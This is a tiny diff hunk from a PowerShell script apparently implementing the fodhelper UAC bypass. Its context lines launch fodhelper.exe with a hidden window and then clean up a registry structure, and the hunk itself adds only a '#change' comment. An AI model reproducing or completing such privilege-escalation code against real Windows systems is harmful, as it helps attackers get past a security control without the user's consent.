@@ -25,6 +25,7 @@ function FodhelperBypass(){
 
     #Perform the bypass
     Start-Process "C:\temp\fodhelper.exe" -WindowStyle Hidden
+    #change
 
     #Remove registry structure
     Start-Sleep 3
